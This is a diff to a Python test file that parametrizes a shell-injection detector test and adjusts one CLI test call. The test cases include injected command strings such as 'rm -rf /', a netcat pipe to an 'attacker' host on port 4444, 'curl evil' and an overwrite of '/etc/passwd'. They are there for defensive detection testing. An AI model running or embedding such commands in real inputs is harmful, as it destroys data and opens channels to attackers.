@@ -52,8 +52,9 @@ def test_redact_handles_shopify_and_jwt() -> None:
 # ---------------------------------------------------------------------------
 
 
-def test_is_shell_injection_detects_metacharacters() -> None:
-    for value in [
+@pytest.mark.parametrize(
+    "value",
+    [
         "foo; rm -rf /",
         "foo | nc attacker 4444",
         "foo && curl evil",
@@ -61,8 +62,10 @@ def test_is_shell_injection_detects_metacharacters() -> None:
         "foo$(whoami)",
         "foo > /etc/passwd",
         "foo\nrm -rf /",
-    ]:
-        assert is_shell_injection(value) is True
+    ],
+)
+def test_is_shell_injection_detects_metacharacters(value: str) -> None:
+    assert is_shell_injection(value) is True
 
 
 def test_is_shell_injection_passes_safe_value() -> None:
@@ -100,7 +103,7 @@ def test_record_trace_redacts_secrets(tmp_path: Path, monkeypatch: pytest.Monkey
     # needs an initialized store to exercise redaction.
     monkeypatch.chdir(tmp_path)
     runner = CliRunner()
-    res = runner.invoke(cli, ["--root", str(tmp_path / "a"), "runtime", "init"])
+    res = runner.invoke(cli, ["--root", str(tmp_path / "a"), "init"])
     assert res.exit_code == 0, res.output
 
     import os
